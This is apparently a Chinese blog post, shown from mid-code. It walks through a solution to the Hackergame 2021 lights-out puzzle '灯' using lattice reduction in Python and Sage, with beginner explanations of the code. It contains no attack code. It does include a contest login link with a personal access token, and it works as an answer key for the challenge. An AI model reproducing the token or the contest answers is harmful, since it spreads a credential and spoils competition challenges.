class=\"number\">256</span> == t:</span><br><span class=\"line\">            ans[i] = j</span><br></pre></td></tr></table></figure></li>\n<li><p><strong>提交答案</strong></p>\n <figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sol = [[<span class=\"number\">0</span>] * <span class=\"number\">12</span> <span class=\"keyword\">for</span> _ <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">12</span>)]</span><br><span class=\"line\"><span class=\"keyword\">for</span> i, (x, y) <span class=\"keyword\">in</span> <span class=\"built_in\">enumerate</span>(free):</span><br><span class=\"line\">    sol[x][y] = ans[i]</span><br><span class=\"line\"><span class=\"built_in\">print</span>(sol)</span><br><span class=\"line\"></span><br><span class=\"line\">data = &#123;</span><br><span class=\"line\">    <span class=\"string\">&#x27;level&#x27;</span>: level_id,</span><br><span class=\"line\">    <span class=\"string\">&#x27;solution&#x27;</span>: <span class=\"built_in\">str</span>(sol),</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">headers = &#123;<span class=\"string\">&#x27;Cookie&#x27;</span>: <span class=\"string\">&#x27;xxx&#x27;</span>&#125;</span><br><span class=\"line\">r = requests.post(<span class=\"string\">&#x27;http://202.38.93.111:12768/submit&#x27;</span>, headers=headers, data=data)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(r.text)</span><br></pre></td></tr></table></figure></li>\n</ol>\n<h2 id=\"遇到的一些问题\"><a href=\"#遇到的一些问题\" class=\"headerlink\" title=\"遇到的一些问题\"></a>遇到的一些问题</h2><ul>\n<li><strong>Latex 矩阵无法正常显示</strong><br>  有少少离奇，这个博客主题要在矩阵的每行结尾加四个反斜杠才能正常换行，否则就挤作一行。</li>\n</ul>\n<h2 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h2><ul>\n<li><a href=\"https://mcfx.us/posts/2021-10-30-hackergame-2021-writeup/\">https://mcfx.us/posts/2021-10-30-hackergame-2021-writeup/</a></li>\n<li><a href=\"https://docs.python.org/3/library/sys.html\">https://docs.python.org/3/library/sys.html</a></li>\n<li><a href=\"https://zhuanlan.zhihu.com/p/67978661\">https://zhuanlan.zhihu.com/p/67978661</a></li>\n</ul>\n","excerpt":"<p>线性同余方程组与格基约化问题</p>","more":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><blockquote>\n<p>没有听到吗？在耳边回荡着的钟声。</p>\n<p>传闻中，远古文明能够捕猎闪电，将其封印在蜿蜒曲折的法阵中，用以驱动炼金术的最高成就——机械之心。</p>\n<p>而在诸多机械之心的流派里，蔚蓝是曾经的王者。无信者窃取神明的奇迹，沉湎于蔚蓝创造出来的虚幻之间，得以逃避残酷的现实。</p>\n<p>只是，火已渐熄，位不见王影。那一抹纯净的蔚蓝也逐渐染上铜锈和铁锈的颜色。破落的圣殿中只剩无名的巡礼者，还在追寻当年先知摩尔留下的足迹。</p>\n<p>此时才明白，那则预言的含义：火焰熄灭之时，钟声响起，余灰纷沓而来，解开沉寂千年的机关，点亮传承的图腾。无火的余灰不能成为柴薪，可也许正因这样，才会如此向往光明吧。</p>\n<p>还没有听到吗？那回荡在耳边的，古老而熟悉的，钟声——</p>\n<p>灯，等灯等灯</p>\n</blockquote>\n<p>以上是 Hackergame 2021 的一道点灯题的题文。</p>\n<p>解这题的时候连线代都不会，拿到神的题解也跑不起来，后来才知道 Sagemath 要另行安装， <code>pip install sage</code> 是无用的。<br>前些天在单人豪华房里坐了几天牢，趁机也入门了一下格密码，隐约联想到这道题有点类似 CVP 的感觉，而再回头看神的题解果真也是这个思路，如今便借着学习一下 Python 和格。<br>考虑到读者水平可能与我相近，故以下的分析我尽可能做到详细，几乎每一步都有分析，相应的，文章篇幅也会比较长。如果能认真读完并理解，相信会有不小的收获。</p>\n<h2 id=\"题目链接\"><a href=\"#题目链接\" class=\"headerlink\" title=\"题目链接\"></a>题目链接</h2><p><a href=\"http://202.38.93.111:12768/login?token=1:MEQCIBY0ubN3BOXYsuRdXzqWIWNf8Jx0Y6giZCSp/Rg8zdNwAiBMZGWaiIGLD33KTfQ5TTLejp9PwGp8Gg4HsJbdo8sVig==\">http://202.38.93.111:12768/login?token=1:MEQCIBY0ubN3BOXYsuRdXzqWIWNf8Jx0Y6giZCSp/Rg8zdNwAiBMZGWaiIGLD33KTfQ5TTLejp9PwGp8Gg4HsJbdo8sVig==</a><br>如果还没关的话应该能打开（）</p>\n<blockquote>\n<p>好吧已经 Hackergame 2022 了，关了。</p>\n</blockquote>\n<h2 id=\"灯-by-mcfx详解\"><a href=\"#灯-by-mcfx详解\" class=\"headerlink\" title=\"灯 by mcfx详解\"></a>灯 by mcfx详解</h2><p>注：此题共 3 关，为 Level0 、 Level1 及 Level2 ，由于 Level1 综合了三关的解法，故以下均以 Level1 为例。</p>\n<ol>\n<li><p><strong>准备数据及函数</strong></p>\n <figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> sage.<span class=\"built_in\">all</span> <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">import</span> sys, requests</span><br><span class=\"line\"></span><br><span class=\"line\">target = [</span><br><span class=\"line\">    [<span class=\"number\">189</span>, <span class=\"number\">189</span>, <span class=\"number\">189</span>, <span class=\"number\">189</span>, <span class=\"number\">189</span>, <span class=\"number\">33</span>, <span class=\"number\">33</span>, <span class=\"number\">33</span>, <span class=\"number\">189</span>, <span class=\"number\">189</span>, <span class=\"number\">189</span>, <span class=\"number\">189</span>],</span><br><span class=\"line\">    [<span class=\"number\">189</span>, <span class=\"number\">189</span>, <span class=\"number\">189</span>, <span class=\"number\">33</span>, <span class=\"number\">33</span>, <span class=\"number\">33</span>, <span class=\"number\">189</span>, <span class=\"number\">33</span>, <span class=\"number\">44</span>, <span class=\"number\">189</span>, <span class=\"number\">189</span>, <span class=\"number\">189</span>],</span><br><span class=\"line\">    [<span class=\"number\">189</span>, <span class=\"number\">189</span>, <span class=\"number\">189</span>, <span class=\"number\">189</span>, <span class=\"number\">189</span>, <span class=\"number\">33</span>, <span class=\"number\">33</span>, <span class=\"number\">33</span>, <span class=\"number\">33</span>, <span class=\"number\">189</span>, <span class=\"number\">189</span>, <span class=\"number\">189</span>],</span><br><span class=\"line\">    [<span class=\"number\">189</span>, <span class=\"number\">189</span>, <span class=\"number\">189</span>, <span class=\"number\">189</span>, <span class=\"number\">189</span>, <span class=\"number\">33</span>, <span class=\"number\">189</span>, <span class=\"number\">33</span>, <span class=\"number\">33</span>, <span class=\"number\">189</span>, <span class=\"number\">189</span>, <span class=\"number\">189</span>],</span><br><span class=\"line\">    [<span class=\"number\">189</span>, <span class=\"number\">189</span>, <span class=\"number\">189</span>, <span class=\"number\">33</span>, <span class=\"number\">33</span>, <span class=\"number\">189</span>, <span class=\"number\">189</span>, <span class=\"number\">33</span>, <span class=\"number\">33</span>, <span class=\"number\">33</span>, <span class=\"number\">189</span>, <span class=\"number\">189</span>],</span><br><span class=\"line\">    [<span class=\"number\">189</span>, <span class=\"number\">134</span>, <span class=\"number\">33</span>, <span class=\"number\">33</span>, <span class=\"number\">189</span>, <span class=\"number\">189</span>, <span class=\"number\">189</span>, <span class=\"number\">189</span>, <span class=\"number\">33</span>, <span class=\"number\">33</span>, <span class=\"number\">189</span>, <span class=\"number\">189</span>],</span><br><span class=\"line\">    [<span class=\"number\">189</span>, <span class=\"number\">144</span>, <span class=\"number\">33</span>, <span class=\"number\">33</span>, <span class=\"number\">189</span>, <span class=\"number\">189</span>, <span class=\"number\">189</span>, <span class=\"number\">189</span>, <span class=\"number\">33</span>, <span class=\"number\">189</span>, <span class=\"number\">189</span>, <span class=\"number\">189</span>],</span><br><span class=\"line\">    [<span class=\"number\">189</span>, <span class=\"number\">142</span>, <span class=\"number\">33</span>, <span class=\"number\">33</span>, <span class=\"number\">189</span>, <span class=\"number\">189</span>, <span class=\"number\">189</span>, <span class=\"number\">189</span>, <span class=\"number\">33</span>, <span class=\"number\">33</span>, <span class=\"number\">33</span>, <span class=\"number\">189</span>],</span><br><span class=\"line\">    [<span class=\"number\">189</span>, <span class=\"number\">100</span>, <span class=\"number\">142</span>, <span class=\"number\">33</span>, <span class=\"number\">189</span>, <span class=\"number\">189</span>, <span class=\"number\">189</span>, <span class=\"number\">189</span>, <span class=\"number\">33</span>, <span class=\"number\">33</span>, <span class=\"number\">33</span>, <span class=\"number\">189</span>],</span><br><span class=\"line\">    [<span class=\"number\">189</span>, <span class=\"number\">142</span>, <span class=\"number\">142</span>, <span class=\"number\">189</span>, <span class=\"number\">189</span>, <span class=\"number\">189</span>, <span class=\"number\">189</span>, <span class=\"number\">189</span>, <span class=\"number\">189</span>, <span class=\"number\">33</span>, <span class=\"number\">189</span>, <span class=\"number\">189</span>],</span><br><span class=\"line\">    [<span class=\"number\">189</span>, <span class=\"number\">59</span>, <span class=\"number\">142</span>, <span class=\"number\">33</span>, <span class=\"number\">189</span>, <span class=\"number\">189</span>, <span class=\"number\">189</span>, <span class=\"number\">189</span>, <span class=\"number\">33</span>, <span class=\"number\">189</span>, <span class=\"number\">189</span>, <span class=\"number\">189</span>],</span><br><span class=\"line\">    [<span class=\"number\">189</span>, <span class=\"number\">189</span>, <span class=\"number\">33</span>, <span class=\"number\">33</span>, <span class=\"number\">189</span>, <span class=\"number\">189</span>, <span class=\"number\">189</span>, <span class=\"number\">189</span>, <span class=\"number\">189</span>, <span class=\"number\">189</span>, <span class=\"number\">189</span>, <span class=\"number\">189</span>],</span><br><span class=\"line\">]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">level01_val</span>(<span class=\"params\">i, j, x, y</span>):</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (x == i <span class=\"keyword\">or</span> y == j):</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">3</span> - (<span class=\"built_in\">abs</span>(x - i) + <span class=\"built_in\">abs</span>(y - j))</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">level2_val</span>(<span class=\"params\">i, j, x, y</span>):</span><br><span class=\"line\">    <span class=\"keyword\">return</span> [<span class=\"number\">31</span>, <span class=\"number\">63</span>, <span class=\"number\">127</span>][<span class=\"built_in\">max</span>(<span class=\"built_in\">abs</span>(x - i), <span class=\"built_in\">abs</span>(y - j))]</span><br><span class=\"line\"></span><br><span class=\"line\">levels = [</span><br><span class=\"line\">    (level01_val, <span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">............</span></span><br><span class=\"line\"><span class=\"string\">............</span></span><br><span class=\"line\"><span class=\"string\">............</span></span><br><span class=\"line\"><span class=\"string\">............</span></span><br><span class=\"line\"><span class=\"string\">............</span></span><br><span class=\"line\"><span class=\"string\">............</span></span><br><span class=\"line\"><span class=\"string\">............</span></span><br><span class=\"line\"><span class=\"string\">............</span></span><br><span class=\"line\"><span class=\"string\">............</span></span><br><span class=\"line\"><span class=\"string\">............</span></span><br><span class=\"line\"><span class=\"string\">............</span></span><br><span class=\"line\"><span class=\"string\">............</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span>),</span><br><span class=\"line\">    (level01_val, <span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">............</span></span><br><span class=\"line\"><span class=\"string\">............</span></span><br><span class=\"line\"><span class=\"string\">..X.X.......</span></span><br><span class=\"line\"><span class=\"string\">..XXX.......</span></span><br><span class=\"line\"><span class=\"string\">..X.X.......</span></span><br><span class=\"line\"><span class=\"string\">............</span></span><br><span class=\"line\"><span class=\"string\">.......XXX..</span></span><br><span class=\"line\"><span class=\"string\">.......X....</span></span><br><span class=\"line\"><span class=\"string\">.......X.X..</span></span><br><span class=\"line\"><span class=\"string\">.......XXX..</span></span><br><span class=\"line\"><span class=\"string\">............</span></span><br><span class=\"line\"><span class=\"string\">............</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span>),</span><br><span class=\"line\">    (level2_val, <span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">............</span></span><br><span class=\"line\"><span class=\"string\">............</span></span><br><span class=\"line\"><span class=\"string\">..X.X...XX..</span></span><br><span class=\"line\"><span class=\"string\">..X.X...X...</span></span><br><span class=\"line\"><span class=\"string\">..XXX..XX...</span></span><br><span class=\"line\"><span class=\"string\">............</span></span><br><span class=\"line\"><span class=\"string\">............</span></span><br><span class=\"line\"><span class=\"string\">..XXX..XXX..</span></span><br><span class=\"line\"><span class=\"string\">...X...X....</span></span><br><span class=\"line\"><span class=\"string\">...X...XXX..</span></span><br><span class=\"line\"><span class=\"string\">............</span></span><br><span class=\"line\"><span class=\"string\">............</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span>)</span><br><span class=\"line\">]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">id</span>(<span class=\"params\">x, y</span>): <span class=\"keyword\">return</span> x * <span class=\"number\">12</span> + y</span><br><span class=\"line\"></span><br><span class=\"line\">level_id = <span class=\"built_in\">int</span>(sys.argv[<span class=\"number\">1</span>])</span><br><span class=\"line\">ban = <span class=\"built_in\">list</span>(<span class=\"built_in\">map</span>(<span class=\"keyword\">lambda</span> x: [y == <span class=\"string\">&#x27;X&#x27;</span><span class=\"keyword\">for</span> y <span class=\"keyword\">in</span> x], levels[level_id][<span class=\"number\">1</span>].split()))</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><code>from sage.all import *</code><br>首先要<strong>安装 Sagemath</strong>，因为 Sagemath 在 Windows 下运行也是要虚拟出一个 Unix 环境，故建议在 WSL 里 <code>sudo apt install sagemath</code> ，可能中途要 <code>apt-get upgrade</code> 。</li>\n<li><code>sys.argv[1]</code><br><code>argv[0]</code> 是脚本名称（它是否为完整路径名取决于操作系统）。则 <code>argv[1]</code> 为省去后缀名的文件名，如 Level0 时为脚本名为 <code>0.py</code> ， <code>argv[1]</code> 为 0 。</li>\n<li><code>ban = list(map(lambda x: [y == &#39;X&#39;for y in x], levels[level_id][1].split()))</code><br><code>lambda</code> 是 Python 的一个关键字，可以用来定义<strong>匿名函数</strong>。<br>所谓匿名函数，就是没有名字的函数，与命名函数类似，都有参数和返回值，只是没有名字。<br>如 <code>add=lambda x, y: x+y</code> 这个函数就将传入的两个参数相加，返回结果，即 <code>add(1, 2)</code> 等于 <code>1+2</code> ； <code>map(lambda x: x+1, [1, 2, 3])</code> 将列表 [1, 2, 3] 中的元素分别加 1 ，其结果 [2, 3, 4] 。<br>这里 <code>map(lambda x: [y == &#39;X&#39;for y in x], levels[level_id][1].split())</code> 一句是将上面定义的 12 阶方阵中 <code>X</code> 转为 <code>True</code> ， <code>.</code> 转为 <code>False</code> ，然后放入一个列表 <code>ban</code> 中，此时 <code>ban</code> 为两级列表。</li>\n</ul>\n</li>\n<li><p><strong>准备矩阵系数</strong></p>\n <figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">m = []</span><br><span class=\"line\">free = []</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">12</span>):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">12</span>):</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ban[i][j]:</span><br><span class=\"line\">            <span class=\"keyword\">continue</span></span><br><span class=\"line\">        free.append((i, j))</span><br><span class=\"line\">        t = [<span class=\"number\">0</span>] * <span class=\"number\">144</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(i - <span class=\"number\">2</span>, i + <span class=\"number\">3</span>):</span><br><span class=\"line\">            <span class=\"keyword\">for</span> y <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(j - <span class=\"number\">2</span>, j + <span class=\"number\">3</span>):</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (<span class=\"number\">0</span> &lt;= x &lt; <span class=\"number\">12</span>) <span class=\"keyword\">and</span> (<span class=\"number\">0</span> &lt;= y &lt; <span class=\"number\">12</span>):</span><br><span class=\"line\">                    t[<span class=\"built_in\">id</span>(x, y)] = levels[level_id][<span class=\"number\">0</span>](i, j, x, y)</span><br><span class=\"line\">        m.append(t + [<span class=\"number\">0</span>])</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><p><code>levels[level_id][0](i, j, x, y)</code><br>这里是在元组里放函数，注意到上面的 <code>Levels=[(levev01_val, &#39;&#39;&#39;...&#39;&#39;&#39;),(...),(...)]</code> ，所以 <code>levels[level_id][0]</code> 是 <code>levev01_val</code> 函数。这样的用法如：</p>\n  <figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">x,y</span>):<span class=\"keyword\">return</span> x+y</span><br><span class=\"line\">tup=(add,<span class=\"number\">1</span>,<span class=\"number\">2</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(tup[<span class=\"number\">0</span>](tup[<span class=\"number\">1</span>],tup[<span class=\"number\">2</span>]))</span><br><span class=\"line\"><span class=\"comment\"># 3</span></span><br></pre></td></tr></table></figure>\n\n<p>  list也可以实现类似操作，Python确实花.jpg。</p>\n</li>\n</ul>\n<p> 不难发现， free[] 里放的是可以点的坐标，如 $(0,0),(0,1)…$<br> 注意到， <code>level01_val</code> 函数在上面已经定义：</p>\n <figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">level01_val</span>(<span class=\"params\">i, j, x, y</span>):</span><br><span class=\"line\"><span class=\"keyword\">if</span> (x == i <span class=\"keyword\">or</span> y == j):</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">3</span> - (<span class=\"built_in\">abs</span>(x - i) + <span class=\"built_in\">abs</span>(y - j))</span><br><span class=\"line\"><span class=\"keyword\">return</span> <span class=\"number\">0</span></span><br></pre></td></tr></table></figure>\n\n<p> 这个函数的参数中 <code>i,j</code> 为操作的点(即按下的点)坐标， <code>x,y</code> 为受影响的点坐标，<strong>返回值为受影响坐标的增量</strong>。<br> 如 <code>(i,j)</code> 为 $(2,3)$ 时，若 <code>x,y</code> 为 $(2,3)$ ，则根据规则，返回值为 3 ，若 <code>x,y</code> 为 $(2,4)$ ，则返回值为 2 ，若 <code>x,y</code> 为 $(3,3)$ ，则返回值为 2 ，若 <code>x,y</code> 为 $(3,4)$ ，则返回值为 0 。如下表：</p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">x\\y\\返回值</th>\n<th align=\"center\">2</th>\n<th align=\"center\">3</th>\n<th align=\"center\">4</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">1</td>\n<td align=\"center\">0</td>\n<td align=\"center\">2</td>\n<td align=\"center\">0</td>\n</tr>\n<tr>\n<td align=\"center\">2</td>\n<td align=\"center\">2</td>\n<td align=\"center\">3</td>\n<td align=\"center\">2</td>\n</tr>\n<tr>\n<td align=\"center\">3</td>\n<td align=\"center\">0</td>\n<td align=\"center\">2</td>\n<td align=\"center\">0</td>\n</tr>\n</tbody></table>\n <figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(i - <span class=\"number\">2</span>, i + <span class=\"number\">3</span>):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> y <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(j - <span class=\"number\">2</span>, j + <span class=\"number\">3</span>):</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"number\">0</span> &lt;= x &lt; <span class=\"number\">12</span>) <span class=\"keyword\">and</span> (<span class=\"number\">0</span> &lt;= y &lt; <span class=\"number\">12</span>):</span><br><span class=\"line\">            t[<span class=\"built_in\">id</span>(x, y)] = levels[level_id][<span class=\"number\">0</span>](i, j, x, y)</span><br><span class=\"line\">m.append(t + [<span class=\"number\">0</span>])</span><br></pre></td></tr></table></figure>\n\n<p> 上面已经定义函数 <code>def id(x, y): return x * 12 + y</code> ，即 <code>id</code> 函数把给定的<strong>坐标</strong>转为方阵<strong>一维展开后的位置</strong>，则此处把每个操作点对整个方阵 144 个位置影响(增量)后面补一个 0 （下面会解释为什么加一个 0 ）放入 <code>t[]</code> 中，此时t可以看作一个<strong>向量</strong>。<br> 每个 <code>t[]</code> 补入 <code>m[]</code> 后，此时 $m$ 是一个 (144-16)x(144+1) 即 <strong>128x145</strong> 的矩阵，且第 145 列全为 0 ( 16 为 X 即<strong>不可操作点的数量</strong>)，如下：<br> $$<br> m=\\begin{pmatrix}<br> 3 &amp; 2 &amp; 1 &amp; 0 &amp; 0 &amp; \\cdots &amp; 0 \\\\<br> 2 &amp; 3 &amp; 2 &amp; 1 &amp; 0 &amp; \\cdots &amp; 0 \\\\<br> 1 &amp; 2 &amp; 3 &amp; 2 &amp; 1 &amp; \\cdots &amp; 0 \\\\<br> 0 &amp; 1 &amp; 2 &amp; 3 &amp; 2 &amp; \\cdots &amp; 0 \\\\<br> \\vdots &amp; \\vdots &amp; \\vdots &amp; \\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots \\\\<br> 0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; \\cdots &amp; 0<br> \\end{pmatrix}<br> $$</p>\n<p> <strong>注意：上面打省略号的地方不全为0！</strong><br> 比如第一行是由如下一个 12x12 的矩阵展开为一维形式：<br> $$<br> \\begin{pmatrix}<br> 3 &amp; 2 &amp; 1 &amp; 0 &amp; 0 &amp; \\cdots &amp; 0 \\\\<br> 2 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; \\cdots &amp; 0 \\\\<br> 1 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; \\cdots &amp; 0 \\\\<br> 0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; \\cdots &amp; 0 \\\\<br> \\vdots &amp; \\vdots &amp; \\vdots &amp; \\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots \\\\<br> 0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; \\cdots &amp; 0<br> \\end{pmatrix}<br> $$</p>\n <figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">144</span>):</span><br><span class=\"line\">    m.append([(i == j) * <span class=\"number\">256</span> <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">144</span>)] + [<span class=\"number\">0</span>])</span><br><span class=\"line\"></span><br><span class=\"line\">t = []</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">12</span>):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">12</span>):</span><br><span class=\"line\">        t.append(target[i][j])</span><br><span class=\"line\">C = <span class=\"number\">256</span></span><br><span class=\"line\">m.append([-x <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> t] + [C])</span><br></pre></td></tr></table></figure>\n\n<p> 不难看出，此时的 $m$ 为如下形式：<br> $$<br> m=\\begin{pmatrix}<br> 3 &amp; 2 &amp; 1 &amp; 0 &amp; 0 &amp; \\cdots &amp; 0 &amp; 0\\\\<br> 2 &amp; 3 &amp; 2 &amp; 1 &amp; 0 &amp; \\cdots &amp; 0 &amp; 0\\\\<br> 1 &amp; 2 &amp; 3 &amp; 2 &amp; 1 &amp; \\cdots &amp; 0 &amp; 0\\\\<br> 0 &amp; 1 &amp; 2 &amp; 3 &amp; 2 &amp; \\cdots &amp; 0 &amp; 0\\\\<br> \\vdots &amp; \\vdots &amp; \\vdots &amp; \\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots &amp; \\vdots \\\\<br> 0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; \\cdots &amp; 3 &amp; 0\\\\<br> 256 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; \\cdots &amp; 0 &amp; 0\\\\<br> 0 &amp; 256 &amp; 0 &amp; 0 &amp; 0 &amp; \\cdots &amp; 0 &amp; 0\\\\<br> 0 &amp; 0 &amp; 256 &amp; 0 &amp; 0 &amp; \\cdots &amp; 0 &amp; 0\\\\<br> 0 &amp; 0 &amp; 0 &amp; 256 &amp; 0 &amp; \\cdots &amp; 0 &amp; 0\\\\<br> 0 &amp; 0 &amp; 0 &amp; 0 &amp; 256 &amp; \\cdots &amp; 0 &amp; 0\\\\<br> \\vdots &amp; \\vdots &amp; \\vdots &amp; \\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots &amp; \\vdots \\\\<br> 0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; \\cdots &amp; 256 &amp; 0 \\\\<br> -189 &amp; -189 &amp; -189 &amp; -189 &amp; -189 &amp; \\cdots &amp; -189 &amp; 256\\\\<br> \\end{pmatrix}<br> $$</p>\n<p> 此时矩阵 $m$ 的前 272 个行向量(即除开最后一个行向量)的<strong>整系数线性组合</strong>即为操作后可以得到的方阵化为一维后的向量， Level0 时只需令该向量与解向量相等，而 Level1 和 Level2 则需要算出离解向量<strong>最近</strong>的可由<strong>这 272 个向量整数系线性表出的向量</strong>作为<strong>新的解向量</strong>，因为我们<strong>不保证在一些点不可操作的前提下仍能整数系线性表出解向量</strong>(<strong>重点，敲黑板</strong>) 。<br> 同时由于题目在模意义下进行，所以若解出的系数为负整数也可以模 256 